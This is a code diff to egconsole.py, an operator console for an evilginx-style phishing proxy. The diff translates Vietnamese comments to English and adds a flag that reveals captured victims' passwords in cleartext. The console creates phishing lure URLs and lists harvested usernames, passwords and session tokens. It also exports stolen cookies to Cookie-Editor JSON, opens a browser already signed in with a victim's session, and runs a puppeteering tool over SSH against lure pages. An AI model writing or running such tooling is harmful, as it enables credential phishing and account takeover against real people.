@@ -1,23 +1,23 @@
 #!/usr/bin/env python3
-# egconsole.py — CONSOLE ĐIỀU KHIỂN DUY NHẤT cho operator (client-side, kiểu Pro)
-# Gộp: egctl (fleet API) + export cookies + session launcher (browser đăng nhập sẵn)
-#       + server ops qua SSH (tail journal, puppet)
+# egconsole.py — THE operator console for fake-evilginx-pro (client-side, Pro-style)
+# Combines: egctl (fleet API) + cookie export + session launcher (pre-authenticated
+#           browser) + node ops over SSH (journal tail, puppet)
 #
 # Usage:
-#   python egconsole.py                        # REPL tương tác
-#   python egconsole.py status                 # chạy 1 lệnh rồi thoát
+#   python egconsole.py                        # interactive REPL
+#   python egconsole.py status                 # run one command, exit
 #
 # Config:
-#   - my-servers.json (array, như egctl)       : fleet mTLS API
-#   - console.json (optional) {"ssh":{...}}    : host/user/key cho tail/puppet
+#   - my-servers.json (array, like egctl)      : fleet mTLS API
+#   - console.json (optional) {"ssh":{...}}    : host/user/key for tail/puppet
 #
-# Lệnh chính (gõ help trong console):
+# Main commands (type help inside the console):
 #   status | phishlets | enable/disable <pl> | reload | hostname <pl> <host>
-#   sessions [n] | session <id> | session-del <id>
+#   sessions [n] | session <id> [--show-pw] | session-del <id>
 #   lures | lure-create <pl> [url] | lure-url <pl> <id> [k=v...] | lure-edit <id> k=v | lure-del <id>
 #   export <id> [file] | open <id> [--url U] [--fresh] [--disable-http2] [--chrome P]
-#   tail [n] | puppet <url> <user> <passfile>
-#   use <server-name>                          # chọn node mặc định (nếu nhiều node)
+#   mcpkey [new] | tail [n] | puppet <url> <user> <passfile>
+#   use <server-name>                          # pick the default node (multi-node)
 
 import cmd
 import json
@@ -40,13 +40,13 @@ CONSOLE_CFG = os.path.join(HERE, "console.json")
 
 def load_servers():
     if not os.path.exists(SERVERS_FILE):
-        print(f"[!] thiếu {SERVERS_FILE}")
+        print(f"[!] missing {SERVERS_FILE}")
         return []
     return _lib_load_servers(SERVERS_FILE)
 
 
 class Api(_LibApi):
-    """mTLS API client cho 1 node (shared implementation ở lib/egapi.py)."""
+    """mTLS API client for one node (shared implementation in lib/egapi.py)."""
 
     def __init__(self, srv):
         srv = dict(srv)
@@ -71,8 +71,8 @@ def mask(s, keep=3):
 
 class Console(cmd.Cmd):
     intro = (
-        "egconsole — fake-evilginx-pro operator console. 'help' để xem lệnh, "
-        "'use <node>' chọn node, Ctrl+D thoát."
+        "egconsole — fake-evilginx-pro operator console. 'help' lists commands, "
+        "'use <node>' selects a node, Ctrl+D quits."
     )
     prompt = "eg> "
 
@@ -88,7 +88,7 @@ class Console(cmd.Cmd):
     # ---------- helpers ----------
     def _require_api(self):
         if not self.api:
-            print("[!] chưa có node — kiểm tra my-servers.json")
+            print("[!] no node configured — check my-servers.json")
             return False
         return True
 
@@ -96,7 +96,7 @@ class Console(cmd.Cmd):
         ssh = self.cfg.get("ssh") or {}
         host, user, key = ssh.get("host"), ssh.get("user", "ubuntu"), ssh.get("key")
         if not host:
-            print("[!] thiếu console.json {'ssh':{'host','user','key'}}")
+            print("[!] missing console.json {'ssh':{'host','user','key'}}")
             return None
         cli = ["ssh", "-i", key, "-o", "BatchMode=yes", f"{user}@{host}", remote_cmd]
         r = subprocess.run(cli, capture_output=True, text=True, timeout=timeout)
@@ -104,14 +104,15 @@ class Console(cmd.Cmd):
 
     # ---------- node selection ----------
     def do_use(self, arg):
-        """use <server-name> — chọn node mặc định"""
+        """use <server-name> — select the default node"""
         for srv in self.servers:
             if srv.get("name") == arg:
                 self.api = Api(srv)
                 self.prompt = f"eg[{self.api.name}]> "
                 print(f"[*] node: {self.api.name} ({srv['host']}:{srv.get('port', 9443)})")
                 return
-        print(f"[!] không thấy node '{arg}'. Các node: " + ", ".join(s.get("name", "?") for s in self.servers))
+        print(f"[!] node '{arg}' not found. Known nodes: "
+              + ", ".join(s.get("name", "?") for s in self.servers))
 
     # ---------- fleet ----------
     def do_status(self, arg):
@@ -139,7 +140,7 @@ class Console(cmd.Cmd):
         print(code, out)
 
     def do_proxy(self, arg):
-        """proxy — xem trạng thái | proxy set <type> <host> <port> <user> <pass> <routes-cách-phẩy> | proxy on | proxy off | proxy route add|del <suffix>"""
+        """proxy — status | proxy set <type> <host> <port> <user> <pass> <comma-routes> | proxy on | proxy off | proxy route add|del <suffix>"""
         parts = arg.split()
         if not parts:
             code, out = self.api.call("GET", "/proxy")
@@ -184,7 +185,7 @@ class Console(cmd.Cmd):
 
     # ---------- sessions ----------
     def do_sessions(self, arg):
-        """sessions [n] — n session mới nhất (mặc định 10)"""
+        """sessions [n] — the n newest sessions (default 10)"""
         code, out = self.api.call("GET", "/sessions")
         if code != 200:
             print(code, out)
@@ -200,17 +201,22 @@ class Console(cmd.Cmd):
             )
 
     def do_session(self, arg):
-        """session <id> — chi tiết: creds (mask) + cookies"""
-        if not arg.isdigit():
-            print("usage: session <id>")
+        """session <id> [--show-pw] — detail: credentials + cookies.
+        The password is masked by default; --show-pw reveals the cleartext."""
+        parts = shlex.split(arg)
+        if not parts or not parts[0].isdigit():
+            print("usage: session <id> [--show-pw]")
             return
-        s = self.api.get_session(int(arg))
+        s = self.api.get_session(int(parts[0]))
         if "error" in s:
             print(s)
             return
+        show_pw = any(p in ("--show-pw", "--reveal") for p in parts[1:])
+        pw = s.get("password") or ""
         print(f"  id      : #{s['id']} [{s.get('phishlet')}]")
         print(f"  username: {s.get('username') or '-'}")
-        print(f"  password: {mask(s.get('password') or '')}  ({len(s.get('password') or '')} ký tự)")
+        print(f"  password: {pw if show_pw else mask(pw)}  ({len(pw)} chars"
+              f"{', cleartext shown' if show_pw and pw else ''})")
         print(f"  ip/ua   : {s.get('remote_addr','?')} / {(s.get('useragent') or '')[:60]}")
         print(f"  landing : {(s.get('landing_url') or '')[:90]}")
         tokens = s.get("tokens") or {}
@@ -248,7 +254,7 @@ class Console(cmd.Cmd):
     do_lurecreate = do_lure_create
 
     def do_lure_url(self, arg):
-        """lure-url <phishlet> <id> [k=v ...] — sinh URL (AES params: rid, email...)"""
+        """lure-url <phishlet> <id> [k=v ...] — build the URL (AES params: rid, email...)"""
         parts = shlex.split(arg)
         if len(parts) < 2:
             print("usage: lure-url <phishlet> <id> [k=v ...]")
@@ -288,7 +294,7 @@ class Console(cmd.Cmd):
         return egcookies.cookies_from_session(s)
 
     def do_export(self, arg):
-        """export <id> [file.json] — cookies ra Cookie-Editor JSON"""
+        """export <id> [file.json] — cookies to a Cookie-Editor JSON file"""
         parts = shlex.split(arg)
         if not parts or not parts[0].isdigit():
             print("usage: export <id> [file.json]")
@@ -303,7 +309,7 @@ class Console(cmd.Cmd):
 
     def do_open(self, arg):
         """open <id> [--url U] [--fresh] [--disable-http2] [--chrome P] [--port N] [--headless]
-        — mở browser ĐÃ ĐĂNG NHẬP với cookies của session"""
+        — open a SIGNED-IN browser with the session's cookies"""
         parts = shlex.split(arg)
         if not parts or not parts[0].isdigit():
             print("usage: open <id> [--url U] [--fresh] [--disable-http2] [--chrome P] [--port N] [--headless]")
@@ -330,7 +336,7 @@ class Console(cmd.Cmd):
                 i += 1
         dicts = self._cookies_from_session(sid)
         if not dicts:
-            print("[!] session không có cookies")
+            print("[!] session has no cookies")
             return
         session_launcher.launch_with_cookies(
             dicts,
@@ -343,7 +349,6 @@ class Console(cmd.Cmd):
             disable_http2=opts["disable_http2"],
         )
 
-    # ---------- server ops (SSH) ----------
     # ---------- MCP key ----------
     def _mcp_key(self, regenerate=False):
         import importlib.util as _ilu
@@ -351,10 +356,9 @@ class Console(cmd.Cmd):
         _m = _ilu.module_from_spec(_spec)
         _spec.loader.exec_module(_m)
         KEY_FILE, new_mcp_key = _m.KEY_FILE, _m.new_key
-        import os as _os
         key = new_mcp_key() if regenerate else None
         if key is None:
-            if not _os.path.exists(KEY_FILE):
+            if not os.path.exists(KEY_FILE):
                 key = new_mcp_key()
             else:
                 key = open(KEY_FILE, encoding="utf-8").read().strip()
@@ -384,22 +388,23 @@ class Console(cmd.Cmd):
         'mcpkey new' generates a NEW key"""
         self._mcp_key(regenerate=arg.strip() == "new")
 
+    # ---------- server ops (SSH) ----------
     def do_tail(self, arg):
-        """tail [n] — journalctl evilginx2 trên VPS (n dòng, mặc định 30)"""
+        """tail [n] — the node's evilginx2 journal (n lines, default 30)"""
         n = arg if arg.isdigit() else "30"
         out = self._ssh(f"sudo journalctl -u evilginx2 --no-pager -n {n} --output=cat | "
                         f"grep -vE 'whitelistIP|POST body' | tail -{n}")
-        print(out or "[!] không có output")
+        print(out or "[!] no output")
 
     def do_puppet(self, arg):
-        """puppet <lure-url> <user> <passfile-local> — chạy evilpuppet-lite trên VPS"""
+        """puppet <lure-url> <user> <passfile-local> — run evilpuppet-lite on the node"""
         parts = shlex.split(arg)
         if len(parts) != 3:
             print("usage: puppet <lure-url> <user> <passfile-local>")
             return
         url, user, passfile = parts
         if not os.path.isfile(passfile):
-            print(f"[!] không thấy {passfile}")
+            print(f"[!] not found: {passfile}")
             return
         import base64
 
@@ -412,7 +417,7 @@ class Console(cmd.Cmd):
             f"-chrome ~/.cache/ms-playwright/chromium-*/chrome-linux*/chrome "
             f"-timeout 200 -mfa-wait 300 2>&1 | tail -8; rm -f /tmp/pp.pass"
         )
-        print(self._ssh(remote, timeout=600) or "[!] không có output")
+        print(self._ssh(remote, timeout=600) or "[!] no output")
 
     def do_quit(self, arg):
         return True
